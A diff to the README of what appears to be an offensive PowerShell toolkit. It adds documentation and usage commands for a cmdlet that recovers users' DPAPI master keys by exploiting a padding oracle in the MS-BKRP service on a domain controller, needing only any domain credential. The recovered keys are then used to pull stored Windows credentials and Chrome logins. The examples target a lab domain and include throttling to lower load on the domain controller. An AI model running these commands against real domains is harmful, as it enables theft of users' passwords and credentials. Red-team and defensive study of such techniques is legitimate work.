@@ -743,6 +743,31 @@ $userKeys = Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.l
 Get-TBOChromeLogins -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys $userKeys
 ```
 
+#### Invoke-TBODpapiMasterKeyBkrp
+
+Recovers a DPAPI master key by exploiting the PKCS#1 v1.5 padding oracle in the MS-BKRP service (`\PIPE\protected_storage`) on a domain controller.
+Any valid domain credential is sufficient — the victim user's credentials are **not** required.
+The attack requires the raw master key file (captured via Backup Operator privileges or a readable roaming-profile share) and contacts the DC directly, not the target host.
+Expect 15–60+ minutes for a 2048-bit key. Use `-QueryThrottleMs` to reduce DC load at the cost of longer runtime.
+Recovered master keys are cached automatically and can be reused by `Get-TBOCredManEntry`, `Get-TBOChromeLogins`, etc.
+
+```powershell
+# Pipe all user master key locations on a target directly into the attack.
+# The DC receives tens of thousands of RPC queries — this is normal for the attack.
+Get-TBODpapiMasterKeyLocations -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User |
+  Invoke-TBODpapiMasterKeyBkrp -DomainController corp1-dc01.corp1.lab.home-labs.lol
+
+# Pipe a single preferred key and throttle queries to reduce DC load (~3× longer runtime).
+Get-TBODpapiMasterKeyLocations -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User |
+  Where-Object IsPreferred |
+  Invoke-TBODpapiMasterKeyBkrp -DomainController corp1-dc01.corp1.lab.home-labs.lol -QueryThrottleMs 5
+
+# Supply raw bytes directly when the file is already available locally.
+Invoke-TBODpapiMasterKeyBkrp -DomainController corp1-dc01.corp1.lab.home-labs.lol `
+  -MasterKeyBytes ([System.IO.File]::ReadAllBytes('.\3d5e3c7b-...-e4f1')) `
+  -MasterKeyGuid '3d5e3c7b-...-e4f1'
+```
+
 #### Get-TBODpapiCredHist
 
 Decrypts DPAPI `CREDHIST` (credential history) files from user Protect directories and returns historical password hashes.
